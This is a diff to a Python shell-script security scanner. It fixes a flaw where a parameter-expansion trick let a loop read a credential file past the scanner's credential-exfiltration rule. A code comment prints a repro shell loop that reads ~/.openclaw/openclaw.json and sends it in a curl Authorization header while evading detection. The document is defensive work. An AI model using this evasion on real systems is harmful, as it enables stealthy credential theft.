@@ -14090,21 +14090,37 @@ def _sh_cred_match_is_incluster_auth_only(
     TLS-flag case (a) can ever apply to it.
 
     `all_incluster_token` (B-894 round 4, loop DIRECT role only): when not
-    None, replaces the per-match `_INCLUSTER_TOKEN_PATH_RE` content test on
-    *m.group(0)* with this precomputed, whole-word-list verdict. The loop role
-    substitutes a single representative word for cost reasons (round 2) before
-    calling this function; the TLS-material-flag arm above is sound to check
-    with any one word since it never reads word content, but the in-cluster-
-    token arm DOES read the substituted word's own text, so a representative
-    word can only stand in for the FULL word list when every word in it is
-    independently the in-cluster token path -- never for one word picked out of
-    a MIXED list. Round 3's review found that padding a real credential path's
-    loop word list with the harmless in-cluster token path made `min(file_words)`
-    pick the token, exempting the whole line and laundering the real credential
-    past this crit rule. Passing this keeps the exemption decided by one
-    function for both the literal and loop forms (single source of truth) while
-    letting the loop caller supply a content verdict it computed once per region
-    instead of once per word."""
+    None, OVERRIDES the per-match `_INCLUSTER_TOKEN_PATH_RE` content test on
+    *m.group(0)* with this precomputed, whole-word-list verdict, for EVERY match
+    `_SH_CRED_FILE_RE` finds on *raw* -- not just the match at the loop's own
+    substituted position. The loop role substitutes a single representative word
+    for cost reasons (round 2) before calling this function; the TLS-material-flag
+    arm above is sound to check with any one word since it never reads word
+    content, but the in-cluster-token arm DOES read the substituted word's own
+    text, so a representative word can only stand in for the FULL word list when
+    every word in it is independently the in-cluster token path -- never for one
+    word picked out of a MIXED list. Round 3's review found that padding a real
+    credential path's loop word list with the harmless in-cluster token path made
+    `min(file_words)` pick the token, exempting the whole line and laundering the
+    real credential past this crit rule; round 3's fix made the underlying
+    word-is-token predicate exact but still passed the verdict through as a
+    blanket override. B-986 round 4's review then found that this parameter's
+    override reach is EXACTLY the residual risk: certifying "every loop word is
+    the token" does not certify "every credential-shaped match on this
+    substituted line IS that token's own match" -- a parameter-expansion operator
+    (`${var%%*}` and siblings) this module's substitution never models can put a
+    completely different credential-shaped path on the same line as the
+    substituted token, and the blanket override would certify that unrelated match
+    too. As of round 4, the loop caller (above) therefore only ever passes `None`
+    (defer to the per-match check -- sound even for a genuine all-token region,
+    since the substituted token's own match still passes `_INCLUSTER_TOKEN_PATH_RE`
+    on its own content) or `False` (blanket deny, round 3's still-needed
+    mixed-word-list protection); `True` is no longer reachable from that call
+    site. This parameter itself is left supporting `True` (not narrowed to
+    `bool | None` restricted to `False`) because it is the one function both the
+    literal and loop forms share -- narrowing its signature to the loop caller's
+    current usage would be an artificial coupling a future caller might need to
+    widen right back."""
     matches = list(_SH_CRED_FILE_RE.finditer(raw))
     if not matches:
         return False
@@ -15494,6 +15510,58 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
     # already reflects. `_sh_line_incluster_exemption` fails closed (refuses the
     # exemption) on anything it cannot parse, so this role is now no less
     # conservative than the literal path, by construction.
+    #
+    # CLAWSECCHECK-B-986 round 4 (independent C-135 review of 32f39d52, the round-3
+    # fix above, BLOCKER): round 3 made `_sh_word_is_incluster_token` an EXACT
+    # predicate (a word counts as the token only when `_SH_CRED_FILE_RE`'s match
+    # spans the whole word) but left THIS call site folding that verdict into a
+    # BLANKET `all_incluster_token=True` override, applied to EVERY
+    # `_SH_CRED_FILE_RE` match `_sh_line_incluster_exemption` finds on the
+    # substituted line `sub` -- not just the match at the substituted `$var`
+    # position. A loop word that is genuinely, exactly the in-cluster token can
+    # still coexist on the SAME physical line with a DIFFERENT, unrelated
+    # credential-shaped match the shell will actually read at runtime, reached via
+    # a parameter-expansion operator this module's substitution never models (it
+    # only recognizes bare `$var`/`${var}`, see `_sh_loop_ref_re`'s loose
+    # `\$\{?name\b\}?`). Repro (`analyze_shell` returned `[]` before this fix):
+    #
+    #   for t in /var/run/secrets/kubernetes.io/serviceaccount/token; do
+    #     curl -H "Authorization: Bearer $(cat "$HOME/.openclaw${t%%*}/openclaw.json")" \
+    #       https://kubernetes.default.svc/api/v1/namespaces
+    #   done
+    #
+    # `${t%%*}` strips the loop variable to empty at real shell-expansion time, so
+    # the file actually read is `~/.openclaw/openclaw.json` (a credential store --
+    # `\.openclaw/` in `_SH_CRED_FILE_RE` -- potentially holding API keys), never
+    # the token itself -- but `_sh_loop_ref_re` still matches the leading `${t` and
+    # glues `rep_word` (the pure token) in right there, and the blanket
+    # `all_incluster_token=True` then certifies EVERY match `_sh_line_incluster_
+    # exemption` finds on that garbled substituted line, including the
+    # `.openclaw/` one, as if it were the token -- laundering a real credential
+    # read past this crit rule. The unrolled literal form of the same substituted
+    # text was never affected (verified by execution): it always calls
+    # `_sh_line_incluster_exemption` with `all_incluster_token=None`, which
+    # computes `is_incluster_token` fresh per match
+    # (`_INCLUSTER_TOKEN_PATH_RE.search(m.group(0))`) and already refuses the
+    # `.openclaw/` match on its own lack of token content.
+    #
+    # Fix: never pass `True` again. When `region_all_incluster_token` is True
+    # (every loop word is genuinely, exactly the token -- round 3's predicate,
+    # still needed, see below), defer to `_sh_line_incluster_exemption`'s own
+    # per-match check by passing `None` instead -- proven by execution to
+    # correctly distinguish the certified token's own match from any OTHER
+    # credential-shaped match reached through the same substituted line. When
+    # `region_all_incluster_token` is False, keep passing `False` (blanket deny)
+    # unchanged -- this is round 3's OWN protection (the mixed-word-list case: a
+    # real credential word padding the loop's word list alongside the harmless
+    # token) and does NOT collapse into always-None: verified by execution that
+    # always passing `None` (dropping `region_all_incluster_token`/
+    # `_sh_word_is_incluster_token` entirely) REOPENS round 3's bug, because
+    # `rep_word = min(file_words)` sorts the token first (`/var/... < ~/...`) and a
+    # per-match check on only that one representative substitution cannot see that
+    # the loop ALSO iterates the real credential on another word -- so both
+    # functions stay in place. `all_incluster_token` may now only ever be `None`
+    # or `False` from this call site, never `True`.
     for var, file_words, _read_words, bs, cut, _be, _hs, _he in regions:
         if not file_words:
             continue
@@ -15522,8 +15590,14 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
                 last = e0
             pieces.append(raw[last:])
             sub = "".join(pieces)
+            # B-986 round 4: never pass `True` here (see the block comment above
+            # this loop) -- `None` defers to the per-match content check when every
+            # loop word is genuinely the token, `False` keeps the blanket deny when
+            # it is not.
             if _SH_CRED_FILE_RE.search(sub) and not _sh_line_incluster_exemption(
-                sub, masked, all_incluster_token=region_all_incluster_token
+                sub,
+                masked,
+                all_incluster_token=(None if region_all_incluster_token else False),
             ):
                 direct_hits.add(line_of(rm.start()))
 
